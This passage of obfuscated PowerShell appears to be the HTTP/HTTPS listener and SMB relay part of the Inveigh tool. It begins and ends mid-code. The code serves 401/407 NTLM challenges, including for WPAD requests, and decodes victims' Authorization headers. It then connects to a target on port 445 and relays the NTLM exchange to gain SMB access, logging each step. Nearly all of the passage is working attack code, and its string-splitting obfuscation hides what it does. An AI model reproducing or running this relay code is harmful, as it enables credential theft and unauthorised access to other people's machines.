        ${HTT`p_H`EAdEr_c`A`ch`E`_co`NTR`Ol} = ""
        ${HT`Tp_hEaDER`_AuTh`E`NTiC`A`Te} = ""
        ${Htt`p_h`Ead`e`R_AU`TheNTicAtE`_d`AtA} = ""
        ${HtTP_M`E`sSAGE} = ""
        ${hTTP_hE`Ad`e`R`_AUthor`izATi`On} =  ""
        ${H`Ttp_`H`EadEr`_hOST} = ""
        ${HTTp`_`he`AdER`_user_`A`GeNt} = ""
        ${htTp_R`eQUe`S`T`_r`Aw_Url} = ""
        ${NT`lm} = ("{1}{0}"-f'M','NTL')
        
        while(!${h`TT`p_LisT`enER}.("{0}{1}"-f'Pend','ing').Invoke() -and !${H`TTp_`c`lIeNT}."c`on`NecTEd")
        {
            &("{3}{2}{1}{0}" -f 'p','ee','t-Sl','Star') -m 10

            if(!${i`NvEigH}."rELAY`_Ru`Nn`iNG")
            {
                break ("{2}{0}{3}{1}" -f'TTP_li','tener_loop','H','s')
            }
        
        }
        
        if(${re`LAy`_sT`ep} -gt 0)
        {
            ${R`elAy_re`Set}++

            if(${re`LAY`_ResET} -gt 2)
            {
                ${i`NvE`igH}."con`S`ol`E_QuEUe".("{0}{1}" -f 'A','dd').Invoke(("{4}{2}{7}{0}{6}{1}{5}{3}"-f 'attack r','i','a','g','SMB rel','n','esett','y '))
                ${s`Mb`_RE`lAY_S`ocKet}.("{0}{1}" -f'Clos','e').Invoke()
                ${ReLa`Y_`StEP} = 0

                if(${IN`V`eIgH}."FiLE_o`U`T`PuT")
                {
                    ${INV`EIGH}."LoG`_`FIlE`_qUEUE".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - SMB relay attack resetting "))
                }

                if(${IN`Ve`igH}."LO`g_OU`TpUT")
                {
                    ${inV`eI`Gh}."l`Og".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay attack resetting "))
                }

            }

        }
        else
        {
            ${rElay_`Re`SET} = 0
        }

        if(${httPS_`L`isTeN`eR})
        {
            
            if(!${H`TtP`_`clieNt}."c`onNE`cTEd" -or ${Ht`Tp`_c`LiE`Nt_ClOsE} -and ${iN`Ve`Igh}."reL`AY`_RUNn`ING")
            {
                ${HTt`P_`cLiENt} = ${hTTp`_`lI`s`Tener}.("{2}{4}{3}{0}{1}"-f'p','Client','A','tTc','ccep').Invoke() 
	            ${HTt`p_cLe`Ar`_s`TReaM} = ${h`T`TP_clI`ent}.("{0}{2}{1}" -f'Ge','Stream','t').Invoke()
                ${hTTP`_s`T`REAm} = &("{2}{1}{0}" -f't','jec','New-Ob') ("{3}{0}{4}{2}{1}" -f'em','y.SslStream','Securit','Syst','.Net.')(${h`T`T`p_cLeAR`_sTReaM},${Fa`lSe})
                ${Ss`l_`cerT} = (&("{3}{4}{1}{2}{0}" -f 'Item','t-C','hild','G','e') ((("{0}{4}{1}{2}{3}"-f 'C','RDkLocalMachine','R','DkMy','ert:'))-RePlACE'RDk',[chaR]92) | &("{3}{0}{1}{2}"-f 're','-Ob','ject','Whe') {${_}."sUB`J`ECt" -match ${iN`VeI`gH}."C`e`R`TIfIC`ATe_cn"})
                ${h`TTp_s`T`ReaM}.("{1}{2}{3}{4}{0}{5}{6}"-f 'cate','A','uthe','n','ti','A','sServer').Invoke(${S`s`l_CErT},${fa`l`se},  (&("{1}{0}" -f'Ci','G')  VariABLe:0L4To )."V`AlUe"::"dEf`A`Ult",${f`AL`SE})
            }

            [byte[]]${s`SL`_r`eQ`UesT_b`ytes} = ${N`Ull}

            do 
            {
                ${HTt`P_R`EQUE`s`T_B`YtE_`CO`Unt} = ${h`TTP_s`T`ReAM}.("{0}{1}"-f 'R','ead').Invoke(${Tcp_rEQ`Ues`T_`BY`Tes},0,${t`cp_`R`EQUest`_bYteS}."LE`NGTh")
                ${s`SL`_ReqUeSt`_by`T`ES} += ${TC`P_r`EQUEST`_By`T`eS}[0..(${httP_`R`eqU`esT_BYTE`_CouNt} - 1)]
            } while (${H`T`Tp_cLea`R_s`Tream}."DAtAava`I`laBle")

            ${TcP_`RequE`ST} =   ( &("{1}{2}{0}"-f'ILditEm','C','h')  ('V'+'ArIABle'+':W2E'+'Hx')  )."v`ALUe"::("{0}{1}{2}"-f'T','oStrin','g').Invoke(${ssL`_R`eQUeSt`_bY`TeS})
        }
        else
        {

            if(!${HtTP`_`c`liEnT}."Con`NEc`T`ed" -or ${hT`Tp_cl`IEnt_`cl`o`SE} -and ${inve`I`gh}."RElAy_Ru`N`N`InG")
            {
                ${HT`TP_`cl`IEnt} = ${H`Ttp`_lisT`EneR}.("{2}{0}{3}{1}" -f'ptTcp','nt','Acce','Clie').Invoke() 
	            ${H`TTP_STre`Am} = ${H`Tt`p_`cliEnT}.("{3}{2}{0}{1}"-f'tre','am','S','Get').Invoke()
            }

            if(${HTt`P`_str`Eam}."d`AT`AAVAiL`ABle")
            {
                ${H`Ttp_D`ATa_`AV`A`ILablE} = ${T`Rue}
            }
            else
            {
                ${h`TTP_d`A`Ta_aVailA`BLE} = ${F`Alse}
            }

            while(${H`T`TP_sTRe`Am}."DATaA`V`AI`Lab`Le")
            {
                ${HT`T`P_STRE`AM}.("{1}{0}" -f 'ead','R').Invoke(${tC`p_`REquES`T`_bY`TeS},0,${t`cP_ReQu`es`T`_BY`TeS}."LeN`gTH")
            }

            ${T`Cp_RequE`st} =  (&("{2}{0}{1}"-f'AR','IABle','V')  ('W2eh'+'x'))."VaL`UE"::("{0}{2}{1}"-f'To','ng','Stri').Invoke(${tCP_Re`quESt`_`BYtes})
        }
        
        if(${Tc`P_rE`Q`UEST} -like ("{0}{1}{2}" -f '47-45-','54-','20*') -or ${t`cP_REqu`eST} -like ("{0}{4}{2}{3}{1}"-f '4','-20*','45-41-4','4','8-') -or ${TCP`_`Re`QUEst} -like ("{4}{0}{1}{2}{3}" -f '50-54-49','-4f-4e','-53-','20*','4f-') -or ${Tc`P_`ReQUEST} -like ("{1}{4}{3}{0}{2}"-f '4e-45-43-','43','54*','-4e-','-4f'))
        {
            ${htT`p_`Raw_uRL} = ${TcP_`RE`quE`St}.("{1}{0}" -f'ubstring','S').Invoke(${t`c`p_ReQUe`sT}.("{0}{1}" -f'In','dexOf').Invoke(("{1}{0}" -f '0-','-2')) + 4,${TcP`_r`eQUe`ST}.("{0}{1}{2}"-f'Subst','rin','g').Invoke(${t`c`P_`ReQuesT}.("{2}{1}{0}"-f 'xOf','e','Ind').Invoke(("{1}{0}" -f'0-','-2')) + 1).("{1}{0}"-f'exOf','Ind').Invoke(("{0}{1}" -f'-20','-')) - 3)
            ${htTP_r`A`w`_u`Rl} = ${H`Ttp`_raW_uRL}.("{1}{0}"-f 'it','Spl').Invoke("-") | &("{2}{0}{1}"-f'ac','h-Object','ForE'){[Char] ( &("{2}{1}{0}" -f 'IAblE','R','VA')  ("KP"+"A"))."vaL`Ue"::("{1}{0}"-f't16','ToIn').Invoke(${_},16)}
            ${HTtp_`REQU`ESt_RA`w_`URl} = &("{1}{2}{0}"-f'-Object','Ne','w') ("{2}{1}{3}{0}"-f'ing','e','Syst','m.Str') (${H`Ttp_R`AW`_`URl},0,${h`TTp_`RAW_URl}."l`Ength")
            ${HTTP_`SOU`R`Ce`_IP} = ${Ht`T`P_C`LiEnT}."clI`EnT"."rE`mO`TeENDp`oINT"."A`ddr`ess"."IPA`D`DRe`sSTostRING"

            if(${Tc`P_`ReQU`eST} -like ("{0}{1}{3}{4}{2}" -f '*-4','8-6F-','20-*','73-74-','3A-'))
            {
                ${h`TTP_h`e`AD`ER_h`osT_`ExTraCt} = ${Tcp`_rEQu`eSt}.("{2}{1}{0}"-f'tring','ubs','S').Invoke(${tCp_R`e`q`UeST}.("{0}{1}"-f'Ind','exOf').Invoke(("{4}{3}{1}{0}{2}"-f'A','73-74-3','-20-','8-6F-','-4')) + 19)
                ${Ht`Tp_HEaDE`R_h`o`S`T_eX`Tra`Ct} = ${htT`P_H`EA`DER`_hOST_eXTRACT}.("{2}{0}{1}" -f 'tri','ng','Subs').Invoke(0,${HtTP_`H`Ead`Er`_`H`ost_ExTRACT}.("{1}{0}" -f'xOf','Inde').Invoke(("{1}{2}{0}"-f '-','-','0D-0A')))
                ${h`Ttp_heAdE`R`_`h`Ost_`ex`TRaCt} = ${hTTp_`hE`ADE`R_`h`OST_E`X`TRACt}.("{1}{0}" -f'plit','S').Invoke("-") | &("{3}{1}{0}{4}{2}" -f 'Each-Obje','or','t','F','c'){[Char] ${k`pa}::("{0}{1}"-f'ToInt1','6').Invoke(${_},16)}
                ${Ht`TP`_h`ea`deR_hOsT} = &("{0}{1}{2}" -f'New','-Ob','ject') ("{0}{2}{3}{1}"-f'S','String','ystem','.') (${h`TtP_HeADer_`H`OST_`exTrAct},0,${ht`T`P_h`eA`dE`R_hO`st_eXtRacT}."leN`g`TH")
            }

            if(${T`CP`_R`EQuesT} -like ("{0}{3}{4}{2}{1}{7}{6}{5}{8}"-f'*','1-67-','65-72-2D-4','-55-','73-','3A','E-74-','65-6','-20-*'))
            {
                ${Ht`T`p_HeaDeR`_`US`eR_`AgEn`T`_ExT`RaCT} = ${Tcp_r`Eq`UEsT}.("{1}{2}{0}"-f 'string','Su','b').Invoke(${TCp_R`EQ`U`Est}.("{1}{0}" -f 'ndexOf','I').Invoke(("{1}{3}{2}{4}{7}{8}{5}{0}{6}" -f'3A','-55','5-72-','-73-6','2D-41-','74-','-20-','6','7-65-6E-')) + 37)
                ${HTTP_hE`Ad`e`R_`USER_aGE`N`T_eX`TRACt} = ${hTTp`_HeAde`R_u`se`R_`Age`Nt`_E`xt`Ract}.("{1}{2}{0}"-f'ing','Su','bstr').Invoke(0,${htT`p_H`eA`DE`R_UsER_aGeN`T_E`X`TRa`ct}.("{1}{0}" -f 'xOf','Inde').Invoke(("{2}{1}{0}"-f '-','D-0A','-0')))
                ${HTTP`_h`e`ADeR_use`R_agENt`_EXT`RACT} = ${HtT`P`_h`EAdeR_u`s`E`R_AgENt_EXtR`ACT}.("{1}{0}" -f 'plit','S').Invoke("-") | &("{0}{3}{2}{1}"-f 'Fo','ct','bje','rEach-O'){[Char]  ${K`pa}::("{2}{0}{1}" -f 't','16','ToIn').Invoke(${_},16)}
                ${Htt`P_`heAdeR`_uS`Er_a`GEnT} = &("{1}{3}{2}{0}" -f 'ct','Ne','-Obje','w') ("{3}{0}{1}{2}" -f's','tem.Strin','g','Sy') (${HTT`P_hEAdER_usEr`_ag`En`T`_extRaCt},0,${h`T`Tp_heAdER_`Us`E`R_agen`T`_ex`Tra`Ct}."L`eNgth")
            }

            if(${H`TtP_`REQUes`T_RA`w_u`Rl_OLD} -ne ${HTtP_ReQU`ESt_`R`AW`_uRl} -or ${h`TTp`_`cliE`Nt_HAnD`le_O`lD} -ne ${HtTp`_ClI`Ent}."CL`ieNt"."HAND`lE")
            {
                ${In`Ve`IgH}."co`NS`oLE`_qUEUe".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP "))
                ${iN`VEi`gH}."COnS`o`L`E_que`UE".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP "))
                ${invE`i`Gh}."co`N`SOle_qUEUe".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent "))

                if(${INvEi`gh}."FIL`e_Ou`TpUT")
                {
                    ${in`V`EiGH}."l`o`g_`F`ile_QuEUe".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP "))
                    ${i`Nv`eIGh}."lOg`_filE_`qUe`Ue".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP "))
                    ${IN`Ve`Igh}."lO`g_`FILE_Qu`Eue".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP "))
                }

                if(${i`NVeigh}."L`OG`_OUTPut")
                {
                    ${INv`Ei`Gh}."L`Og".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP "))
                    ${iN`VeI`gH}."L`OG".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP "))
                    ${I`NVEIgh}."l`OG".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP "))
                }

                if(${p`RoXY} -eq 'Y' -and ${pRoX`yig`NO`RE}."COu`NT" -gt 0 -and (${p`RoXy`Ign`OrE} | &("{1}{0}{2}"-f'ere','Wh','-Object') {${Htt`p_hEa`dER`_usER_`AgeNT} -match ${_}}))
                {
                    ${In`VeIgH}."Co`NSo`lE`_QuEue".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP "))

                    if(${In`VE`igH}."file`_ouT`p`Ut")
                    {
                        ${INV`EiGH}."lOG_FiL`e`_QUEue".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP "))
                    }

                    if(${In`VEI`gH}."LO`g_oU`Tp`UT")
                    {
                        ${Invei`GH}."L`oG".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP "))
                    }

                }

            }

            if(${tcp_`RE`queST} -like ("{7}{11}{0}{2}{1}{5}{8}{4}{12}{13}{3}{6}{9}{10}" -f '1-75-','4','7','69-6F-6E-','-69','-68-','3A-2','*','6F-72','0','-*','-4','-7A-61-74','-'))
            {
                ${H`T`TP`_hEa`DeR`_autH`ORizA`TioN`_ExtR`Act} = ${tC`P_REQ`UESt}.("{2}{0}{1}" -f 'n','g','Substri').Invoke(${t`cp_r`EqU`ESt}.("{0}{2}{1}" -f'I','dexOf','n').Invoke(("{8}{9}{7}{1}{4}{12}{3}{5}{0}{6}{2}{11}{10}" -f'-6','68','-3','2-','-6F','69-7A-61-74','9-6F-6E','75-74-','-4','1-','-20-','A','-7')) + 46)
                ${hT`Tp_HEaD`ER_aut`HoRIzAtI`On`_EXt`RACt} = ${Ht`Tp_HEAdeR_`A`UThO`R`Iza`TiO`N_eXtrACt}.("{2}{1}{0}" -f'g','in','Substr').Invoke(0,${H`TtP_H`EadeR`_`AUth`o`RIZAti`o`N_E`xTRA`ct}.("{0}{2}{1}" -f 'I','f','ndexO').Invoke(("{0}{2}{1}"-f '-','-0A-','0D')))
                ${HtTp`_HeadeR_a`UTh`OrI`Za`T`iOn_E`x`Tr`ACT} = ${htTp_He`AdEr_aU`THOriZAtIo`N_`e`xtrA`cT}.("{0}{1}" -f'Spl','it').Invoke("-") | &("{1}{2}{0}{3}"-f 'c','ForEach-Obj','e','t'){[Char] (  &("{1}{0}"-f 'em','IT') VarIaBLe:KpA )."v`AlUe"::("{0}{1}" -f 'ToIn','t16').Invoke(${_},16)}
                ${hTT`p`_heADeR_AUThOR`IzATI`On} = &("{0}{2}{1}"-f 'New-Ob','ct','je') ("{1}{2}{0}" -f 'ring','System.','St') (${htT`p`_he`A`Der_auTho`RIZATiOn_eXTrA`cT},0,${htTP`_HEAdeR_Au`Th`oRizat`I`on_`extR`ACt}."lEnG`Th")
            }

            if((${htt`p_`RE`QueST_`Raw_URL} -notmatch ("{2}{0}{1}" -f'd.','dat','/wpa') -and ${HT`T`PAuth} -eq ("{0}{2}{1}"-f 'Anon','s','ymou')) -or (${hTtp`_r`EqU`Est`_Ra`W`_urL} -match ("{1}{2}{0}"-f't','/wp','ad.da') -and ${WP`A`DAUth} -eq ("{2}{1}{0}"-f'ous','m','Anony')) -or (
            ${HTtP_R`e`qUE`St_RAW_`U`Rl} -match ("{1}{0}" -f't','/wpad.da') -and ${WPA`DAuth} -like ("{0}{1}"-f'NTLM','*') -and ${WPADAuT`H`i`GnorE}."C`ouNt" -gt 0 -and (${wp`AdAUTh`iGnO`RE} | &("{0}{1}{2}" -f'Where-','Objec','t') {${HTtP_hEadeR`_u`sE`R`_AG`ent} -match ${_}})))
            {
                ${H`TTp_`R`ESPON`sE_sta`Tus_`C`ODe} = 0x32,0x30,0x30
                ${HtTp`_`R`esp`O`NSE_PHrA`SE} = 0x4f,0x4b
                ${H`TtP`_c`l`iENt_clo`SE} = ${t`Rue}
            }
            else
            {
                
                if(${p`R`oXy`_lISTE`NER})
                {
                    ${HttP_`REsPoNs`E_stA`Tus_CO`de} = 0x34,0x30,0x37
                    ${htt`P_`hE`AdER_`AUt`HEnTIC`ATE} = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    ${HtTp_R`ESPO`NS`E_`STa`Tu`S_coDe} = 0x34,0x30,0x31
                    ${HT`Tp_HE`Ad`eR_aUTHEnt`ICAtE} = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20

                    if(${ht`T`P_r`EQUeSt`_RA`W_URl} -match ("{0}{1}{2}" -f'/wpa','d','.dat'))
                    {
                        ${H`Tt`P_`ReSET_d`E`lAY} = ${t`RUE}
                        ${H`Ttp_`R`Eset`_Delay_tIMeOUT} = &("{2}{0}{1}"-f'imeSp','an','New-T') -Seconds ${HTT`P`Re`s`eTdelAytIm`Eout}
                        ${h`TtP_`Re`sE`T_dElaY_StopWAtCh} =   (&("{3}{2}{1}{0}"-f 'tEM','di','eT-ChiL','g') vaRiAblE:yUB6)."VAl`Ue"::("{1}{2}{0}" -f'ew','S','tartN').Invoke()
                    }

                }

                ${hTtP_`ReSponsE`_`Ph`RA`sE} = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
                ${HTtp`_cL`i`en`T`_cLoSe} = ${fAl`SE}
            }
        
            if(${Ht`Tp_h`E`AD`ER`_`AuThORIz`AtiON}.("{1}{2}{0}" -f'h','Start','sWit').Invoke(("{0}{1}" -f 'NT','LM ')))
            {
                ${HTt`P_`He`ADER_AuT`H`oRIza`T`I`oN} = ${HTtP_H`EAde`R_A`UT`hOR`I`ZATiON} -replace ("{1}{0}" -f'M ','NTL'),''
                [Byte[]]${htTp_R`E`QUEst`_bYTes} =   ${k`Pa}::("{3}{1}{0}{2}" -f '4','e6','String','FromBas').Invoke(${ht`Tp_He`AD`er_A`Ut`hor`I`ZaTi`On})
            
                if(  (  &("{1}{0}"-f 'M','GeT-iTE') ("vaRiabLE"+":w2eH"+"x")  )."v`Alue"::"toS`Tr`iNg"(${HTT`P_rEQue`s`T_byT`ES}[8..11]) -eq ("{0}{2}{1}" -f'01','0-00-00','-0'))
                {
                
                    if(${I`NV`EIGh}."SMb_`Re`Lay" -and ${Ht`TP_S`OurcE`_IP} -ne ${Ta`R`gEt} -and ${r`Elay_S`T`eP} -eq 0)
                    {

                        if(${iNv`EiGH}."f`i`LE_O`UtPUt")
                        {
                            ${I`Nve`igh}."l`O`g_FI`Le_qUeUE".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by $HTTP_source_IP "))
                            ${InVEI`GH}."Log_f`ILE_`qu`euE".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - Grabbing challenge for relay from  ") + ${T`A`RgEt})
                        }

                        if(${i`NvEIGH}."LOg`_`ouTput")
                        {
                            ${i`NveI`GH}."L`OG".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by $HTTP_source_IP "))
                            ${I`NVeiGh}."l`Og".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Grabbing challenge for relay from  ") + ${t`A`RGET})
                        }

                        ${IN`V`eigh}."cO`NsoL`E_qUEue".("{1}{0}"-f'dd','A').Invoke(("$HTTP_type to SMB relay triggered by $HTTP_source_IP at $(Get-Date -format 's') "))
                        ${In`VeI`gH}."CO`N`SOLE_`q`UeUE".("{0}{1}"-f'A','dd').Invoke(('Grabb'+'in'+'g '+'challe'+'n'+'ge '+'fo'+'r '+'relay'+' '+'from'+' '+"$Target"))
                        ${S`M`B_reLaY_sO`cKet} = &("{3}{1}{2}{0}"-f't','ew-','Objec','N') ("{7}{0}{5}{2}{6}{4}{3}{1}"-f 'stem.Net.S','t','ckets.','lien','C','o','TCP','Sy')
                        ${SMB_rE`LAy`_SOcK`eT}."Cli`enT"."reCeIVET`ime`OuT" = 60000
                        ${SMB_r`eLaY`_sO`cKEt}.("{0}{2}{1}" -f'Con','ct','ne').Invoke(${Targ`ET},"445")
                        ${ht`T`P_CLI`E`Nt_clOSE} = ${FA`lsE}
                        ${R`e`Lay`_sTEp} = 1
                    
                        if(!${SmB`_Re`lAy_SoC`kEt}."cONN`E`Cted")
                        {
                            ${i`N`VEigH}."cON`soL`E_qUEUe".("{1}{0}" -f'dd','A').Invoke(("{8}{2}{0}{7}{4}{1}{5}{3}{6}"-f'lay target','t ','re','ond',' no','resp','ing',' is','SMB '))
                            ${Re`LaY_`S`TeP} = 0

                            if(${iN`VeI`Gh}."filE_`OUtP`UT")
                            {
                                ${iNv`E`igh}."log_`F`il`E_`qUEUe".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - SMB relay target is not responding "))
                            }

                            if(${iN`VE`igH}."LO`G`_oUtp`Ut")
                            {
                                ${IN`VEIgH}."l`oG".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay target is not responding "))
                            }

                        }

                        if(${re`lA`y_Step} -eq 1)
                        {
                            ${S`m`B_ReLA`Y_bYT`ES} = &("{3}{0}{1}{2}" -f 'ayCh','al','lenge','SMBRel') ${sm`B`_Re`La`Y_`sockET} ${HTTP_`RE`que`S`T`_By`TEs} ${s`MB`_vErsION}

                            if(${sm`B`_`ReLay`_ByTEs}."Leng`Th" -le 3)
                            {
                                ${re`lAy_`ST`eP} = 0
                                ${nt`lM} = &("{1}{5}{3}{0}{2}{4}"-f'se','NTLM','6','hallengeBa','4','C') ${CHAl`L`eNge} ${HTT`P_so`UR`Ce_Ip} ${HtT`P_`clIE`NT}."CLi`EnT"."remo`TEEN`D`PoinT"."po`Rt"
                            }

                        }

                        if(${rElAY`_`s`TEP} -eq 1)
                        {
                            ${SMb`_use`R`_ID} = ${s`Mb`_R`ELA`y_BYTes}[34..33]
                            ${Smb_`Rela`y_NTlms`Sp} =  ${w`2EHX}::("{0}{2}{1}"-f 'To','ring','St').Invoke(${Sm`B_`ReLAy_b`Y`TES})
                            ${s`m`B_`RE`laY_`NtLmSSP} = ${S`MB_R`eLaY`_ntLM`S`Sp} -replace "-",""
                            ${SmB_`ReL`A`y_N`TLMSsp`_in`deX} = ${sMB_`RelA`y_n`T`lM`ssp}.("{1}{0}{2}"-f 'xO','Inde','f').Invoke(("{3}{2}{1}{0}"-f'0','5353500','E544C4D','4'))
                            ${SmB_RelAy_n`TlmsSp_bYteS_`i`N`deX} = ${sMb_ReLaY`_nT`lm`S`S`P`_iNdeX} / 2
                            ${sMB_`D`O`mA`i`N_lENgTH} = &("{1}{2}{0}"-f'th2','DataL','eng') (${sMB_R`E`lA`Y_nTLms`SP_b`Yt`E`S_iNdEX} + 12) ${s`MB_Re`LaY`_byteS}
                            ${S`Mb`_D`oMAin_LEnGTh`_O`F`FSET_b`yTEs} = ${Smb_rE`lAY`_`ByTes}[(${smB_R`ELaY_n`TL`mSSP_`B`yTES_`i`Nd`EX} + 12)..(${sM`B`_R`elAY_NTlMssP_bYt`Es_i`NDEx} + 19)]
                            ${S`mB_TARg`Et_`L`eNG`TH} = &("{2}{0}{1}" -f 'taLeng','th2','Da') (${s`M`B_R`ElAY_NTlMSsp`_`BYtes_IND`Ex} + 40) ${Sm`B_Re`Lay_b`Yt`es}
                            ${smB`_TaR`GE`T_`lENgT`h_OFF`SEt_by`TES} = ${SMb`_R`ElAY_`BY`Tes}[(${S`mb`_re`Lay`_nt`lMsSP_b`y`TeS_i`ND`EX} + 40)..(${smb_`ReLaY`_NtlM`sSp_By`Tes_IN`dex} + 55 + ${s`M`B_`DOmAin_lEngTh})]
                            ${sMb_R`Elay`_T`ArgeT`_FLaG} = ${sMb`_ReL`A`Y_BYtES}[(${s`M`B`_ReLa`y_NTlmSSp`_`ByTES_`ind`ex} + 22)]
                            ${smB_rELA`y`_`NtLM_chA`L`leNGe} = ${smb_r`E`lAY_by`Tes}[(${SMb_r`ElAy_`NTlM`SsP_`BYteS`_IN`dEX} + 24)..(${sMB_RELA`Y_`N`TLmSs`p_byteS`_`iN`D`ex} + 31)]
                            ${SM`B`_`RElAY_`TArGe`T_D`eTA`IlS} = ${SM`B_r`e`LAy_bY`TEs}[(${sm`B_rElaY_NtlM`S`sp_`BYteS`_`INDEX} + 56 + ${Smb_D`oMa`IN_`LENGTH})..(${SMB_rELAY`_nTLmSsP`_By`Tes_`In`D`EX} + 55 + ${SM`B`_DOMAi`N_LEnG`TH} + ${sMB`_tar`gEt_`le`Ng`Th})]
                            ${Sm`B_`session_id} = ${sMb_rEL`Ay`_B`yTEs}[44..51]
                            
                            if( (  &("{3}{0}{1}{2}"-f'T-VA','RIABl','e','Ge') W2ehX )."Va`Lue"::"T`oSTr`ING"(${sM`B_r`ElAy`_`BY`Tes}[4..7]) -eq ("{0}{1}{2}"-f 'f','f-53-4d','-42'))
                            {
                                ${S`mb_`VERsIon} -eq ("{1}{0}" -f'1','SMB')
                            }
                    
                            ${H`T`TP_`NtLm`_bYtES} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                                               ${SMB_Do`Main`_l`ENG`Th_`ofFSe`T`_bYT`Es} +
                                               0x05,0x82 +
                                               ${S`mB_reLay`_t`ArG`ET_f`L`AG} +
                                               0xa2 +
                                               ${SmB`_`RElA`Y_nTL`m_CHalLEN`GE} +
                                               0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                               ${smB_tA`RGEt`_l`eNg`TH_oF`Fse`T_`ByT`es} +
                                               ${SMb_relA`Y_`TaR`g`Et_`DeT`AIls}
                    
                            ${NTl`m`_`CHa`LLeNge_b`ASE64} =   (&("{0}{2}{1}"-f'v','bLE','arIA')  ('kP'+'A')  -VAlUeONly )::"tObAsE`64`sT`R`Ing"(${Ht`T`p_NtlM_B`y`TEs})
                            ${n`TlM} = ("{0}{1}" -f'NT','LM ') + ${ntlm_chAl`Le`Ng`E`_B`A`se64}
                            ${NTlM_`CH`ALlEN`Ge} = &("{3}{1}{0}{2}"-f'Chall','BNTLM','enge','SM') ${SM`B_Re`LA`Y`_BYteS}
                            ${in`V`eIGH}."HT`T`p_`cHallEnge`_QU`EuE".("{0}{1}"-f 'A','dd').Invoke(${httP_s`oURC`E`_ip} + ${hT`Tp_Cli`eNt}."CL`ient"."r`Em`OtEeN`dpOint"."po`Rt" + ',' + ${NtLM`_cH`AlL`EnGE})
                            ${I`NvEi`Gh}."Con`SoLE_Qu`Eue".("{0}{1}"-f 'Ad','d').Invoke(('Received'+' '+'challe'+'nge'+' '+"$NTLM_challenge "+'fo'+'r '+'r'+'elay '+'fro'+'m '+"$Target"))
                            ${Inv`EI`gh}."con`sole`_QUeUe".("{0}{1}"-f 'A','dd').Invoke(('P'+'rovidi'+'ng '+'c'+'hallen'+'g'+'e '+"$NTLM_challenge "+'f'+'or '+'r'+'el'+'ay '+'t'+'o '+"$HTTP_source_IP"))
                            ${R`eLaY_`steP} = 2

                            if(${InVE`i`gh}."FI`LE_O`UtpuT")
                            {
                                ${I`NVeI`GH}."log_fiL`e`_`QUE`UE".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - Received challenge $NTLM_challenge for relay from $Target "))
                                ${i`NvE`iGh}."Lo`g_`FilE_`qUEue".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - Providing challenge $NTLM_challenge for relay to $HTTP_source_IP "))
                            }

                            if(${i`NV`EigH}."Lo`G_OU`TPut")
                            {
                                ${iNV`e`IGH}."l`og".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - Received challenge $NTLM_challenge for relay from $Target "))
                                ${invEi`gH}."L`og".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - Providing challenge $NTLM_challenge for relay to $HTTP_source_IP "))
                            }

                        }
                        else
                        {
                            ${nt`lm} = &("{4}{0}{2}{3}{1}"-f 'MChallenge','se64','B','a','NTL') ${cHA`llEN`ge} ${H`TTP_`SOUR`Ce_IP} ${httP`_clIe`Nt}."cLi`ent"."REM`o`T`E`endpOint"."PO`RT"
                        }

                    }
                    else
                    {
                         ${NT`lm} = &("{2}{4}{1}{3}{5}{0}" -f'ase64','ll','NTLMCh','en','a','geB') ${cH`A`LlEngE} ${Http_sOUr`C`e`_iP} ${HT`Tp`_cLi`enT}."C`LIENt"."REMOT`E`en`dpOiNt"."po`Rt"
                    }

                }
                elseif( ( &('lS') varIABLE:w2Ehx )."vA`lue"::"TOs`T`RiNg"(${HtTP_RE`QU`EsT_`ByTES}[8..11]) -eq ("{1}{2}{0}" -f'-00','03-00-','00'))
                {
